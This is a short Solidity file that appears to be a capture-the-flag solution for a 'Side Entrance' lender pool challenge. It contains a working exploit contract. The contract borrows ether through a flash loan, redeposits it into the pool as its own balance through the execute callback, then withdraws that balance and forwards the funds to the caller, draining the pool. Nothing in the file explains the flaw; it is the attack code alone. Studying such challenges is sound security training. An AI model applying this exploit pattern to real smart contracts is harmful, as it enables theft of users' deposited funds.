// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;

    ISideEntranceLenderPool private sideEntrance;

    receive() external payable {
    }
    
    constructor(ISideEntranceLenderPool _sideEntrance) {
        sideEntrance = _sideEntrance;
    }

    function execute() public payable {
        sideEntrance.deposit{value: msg.value}();
    }

    function attack(uint256 _amount) public {
        sideEntrance.flashLoan(_amount);
        sideEntrance.withdraw();
        payable(msg.sender).sendValue(_amount);
    }
}